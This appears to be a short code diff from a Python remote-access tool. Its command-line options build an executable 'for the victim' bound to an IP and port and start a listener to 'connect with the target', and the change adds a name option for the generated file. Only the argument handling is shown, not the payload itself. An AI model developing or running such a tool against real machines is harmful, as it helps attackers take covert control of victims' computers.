@@ -47,11 +47,12 @@ while True:
     parser.add_argument("-PORT", "--port", help="generate .exe for the victim")
     parser.add_argument("-CONNECT", "--connect", action="store_true", help="Connects with the target.")
     parser.add_argument("-CLEAR", "--clear", action="store_true", help="Clear ui.")
+    parser.add_argument("-NAME", "--name", help="Clear ui.")
 
     args = parser.parse_args(colt_cm)
 
     if args.exe:
-        ge.create_exe(args.ip, args.port)
+        ge.create_exe(args.ip, args.port, args.name)
 
     elif args.connect:
         client.listener(args.ip, args.port)
